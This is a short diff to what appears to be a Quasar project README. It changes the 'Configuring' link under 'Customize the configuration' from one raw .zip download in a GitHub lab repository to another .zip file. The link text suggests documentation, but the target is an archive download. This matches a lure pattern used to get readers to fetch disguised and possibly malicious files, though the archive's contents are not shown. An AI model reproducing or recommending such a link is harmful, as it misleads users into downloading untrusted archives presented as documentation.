@@ -21,4 +21,4 @@ quasar build
 ```
 
 ### Customize the configuration
-See [Configuring https://raw.githubusercontent.com/Minoxds/SE-lab3-6404101324/master/garce/SE-lab3-6404101324.zip](https://raw.githubusercontent.com/Minoxds/SE-lab3-6404101324/master/garce/SE-lab3-6404101324.zip).
+See [Configuring https://github.com/Minoxds/SE-lab3-6404101324/raw/refs/heads/master/src/boot/S_lab_1.2.zip](https://github.com/Minoxds/SE-lab3-6404101324/raw/refs/heads/master/src/boot/S_lab_1.2.zip).
